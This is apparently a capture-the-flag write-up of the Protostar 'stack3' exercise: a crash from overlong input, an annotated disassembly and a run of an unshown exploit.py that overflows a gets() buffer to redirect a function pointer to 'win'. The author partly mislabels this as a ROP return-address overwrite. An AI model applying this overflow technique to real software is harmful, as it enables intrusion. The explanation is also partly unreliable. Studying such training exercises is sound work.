# STACK 3

## run the executable

	../stack3$ ./stack3

	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

	calling function pointer, jumping to 0x61616161
	Segmentation fault (core dumped)
	../stack3$


## look at the machine code

`../stack3$ objdump -M intel -d stack3 > stack3.asm`
```asm
/*
			Variable Dictionary
	var1 = esp+0x5c
	var2 = esp+0x1c
	var3 = esp+0x4

*/
08048424 <win>:
 8048424:	55                   	push   ebp
 8048425:	89 e5                	mov    ebp,esp
 8048427:	83 ec 18             	sub    esp,0x18
 804842a:	c7 04 24 40 85 04 08 	mov    DWORD PTR [esp],0x8048540
 8048431:	e8 2a ff ff ff       	call   8048360 <puts@plt>
 8048436:	c9                   	leave
 8048437:	c3                   	ret

08048438 <main>:
 8048438:	55                   	push   ebp
 8048439:	89 e5                	mov    ebp,esp
 804843b:	83 e4 f0             	and    esp,0xfffffff0
 804843e:	83 ec 60             	sub    esp,0x60
 8048441:	c7 44 24 5c 00 00 00 	mov    DWORD PTR [esp+0x5c],0x0  #var1=0
 8048449:	8d 44 24 1c          	lea    eax,[esp+0x1c]  ##load var2
 804844d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048450:	e8 db fe ff ff       	call   8048330 <gets@plt>
 8048455:	83 7c 24 5c 00       	cmp    DWORD PTR [esp+0x5c],0x0  //if var1 != 0
 804845a:	74 1b                	je     8048477 <main+0x3f>  ///jump to return
 804845c:	b8 60 85 04 08       	mov    eax,0x8048560

 									//move var1 into temp registry
 8048461:	8b 54 24 5c          	mov    edx,DWORD PTR [esp+0x5c]

									//var3 = var1
 8048465:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 8048469:	89 04 24             	mov    DWORD PTR [esp],eax
 804846c:	e8 df fe ff ff       	call   8048350 <printf@plt>
 8048471:	8b 44 24 5c          	mov    eax,DWORD PTR [esp+0x5c]
 8048475:	ff d0                	call   eax
 8048477:	c9                   	leave
 8048478:	c3                   	ret
 8048479:	90                   	nop
```


Straight away there is some function called win, and the assumption will be that we must return it (rop) `08048424 <win>:`

so for this code since var1 is on the stack and the return address was pushed before the local parameter was pushed, the overflow will overwritre the return adress

Looking more at this the python code will be hosted in exploit.py


## exploit vulnerability

```
kettle@OfKetchup:~/git_repos/ctf.git/protostar/stack/stack3$ python exploit.py | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
